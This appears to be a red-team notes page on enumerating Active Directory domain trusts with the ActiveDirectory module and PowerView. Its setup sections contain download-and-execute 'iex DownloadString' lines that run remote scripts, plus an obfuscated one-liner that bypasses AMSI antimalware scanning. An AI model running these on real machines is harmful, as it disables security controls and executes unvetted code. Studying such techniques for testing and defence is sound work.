---
title: "Domain Trusts"
description: "Enumerating domain trusts."
lead: "Enumerating information about domain trusts using the ActiveDirectory PowerShell module and PowerView."
date: 2021-11-07T18:09:42+01:00
lastmod: 2021-11-07T18:09:42+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 70
toc: true
---

## General

- Relationship between two domains or forest
- Trusted Domain Objects (TDOs) represent trust relationship in a domain
- Types of trusts
  - One-way: users in trusted domain can access resources in the trusting domain
  - Two-way trust: users of both domains can access resources in the other domain
  - Transitive: If A and B trust each other and B and C trust each other, A and C also trust each other (default between domains in same forest)
  - Non-transitive: cannot be extended to other domains in the forest (default between two domains in different forests)
  - Automatic trust: created automatically when creating new subdomain (parent-child, tree-root)
  - Shortcut trusts: used to reduce access time in complex trust scenarios
  - External trusts: between two domains in different forests when forests do not have a turst relationships
  - Forest trusts: between forest root domains

## ActiveDirectory Module

### Setup

```powershell
# If computer has internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# If computer has no internet access, download repository
Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1

# Check if module has been imported correctly
Get-Command -Module ActiveDirectory
```

### Commands

```powershell
# Get a list of all domain trusts for the current domain
Get-ADTrust
Get-ADTrust -Filter * | Select Source,Target,Direction
Get-ADTrust -Identity test.lab.local
```

## PowerView

### Setup

```powershell
# If it gets blocked by AMSI we can bypass it with
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Then load the module
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# With internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
```

### Commands

```powershell
# Get a list of all domain trusts for the current domain
Get-NetDomainTrust
Get-NetDomainTrust -Domain test.lab.local
```
